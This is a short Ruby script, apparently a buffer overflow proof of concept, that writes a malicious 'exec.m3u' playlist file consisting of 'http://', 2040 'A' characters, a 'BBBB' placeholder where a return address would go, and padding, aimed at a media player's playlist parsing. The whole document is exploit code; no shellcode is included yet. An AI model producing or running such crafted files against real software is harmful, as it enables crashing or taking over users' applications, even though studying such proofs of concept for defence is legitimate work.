#!/usr/bin/env ruby

sploitfile = "exec.m3u"

junk = "A" * 2040
junk2 = "BBBB" #00125D2C
junk3 = "C" * 6
#nops = "\x90\x90"

payload = "http://" + junk + junk2 + junk3

puts " [+] Writing exploit file #{sploitfile}"
File.open(sploitfile, 'w') {|f| f.write(payload)}

puts " [+] File written"
puts " [+] #{payload.size} bytes"